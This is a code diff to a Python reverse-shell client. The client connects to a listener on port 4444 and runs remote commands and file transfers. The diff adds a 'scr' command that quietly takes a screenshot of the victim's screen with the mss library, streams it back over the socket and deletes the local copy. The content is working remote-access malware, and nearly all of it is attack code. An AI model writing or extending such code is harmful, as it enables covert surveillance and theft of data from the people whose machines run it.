@@ -1,6 +1,7 @@
 import socket
 import os
 import subprocess as sb
+import mss
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 h="127.0.0.1"
 p=4444
@@ -75,5 +76,20 @@ while True:
                 data = s.recv(1024)
                 file.write(data)
                 c+=len(data)
+
+    if com == "scr":
+     
+        with mss.mss() as img:
+            img.shot(output="screen.png")
+            with open("screen.png" ,"rb") as f:
+                c=0
+                size= os.path.getsize("screen.png")
+                s.sendall(str(size).encode(e))
+                while c < size:
+                    data=f.read()
+                    s.sendall(data)
+                    c+=len(data)
+                        
+            os.remove("screen.png")
     
 s.close()
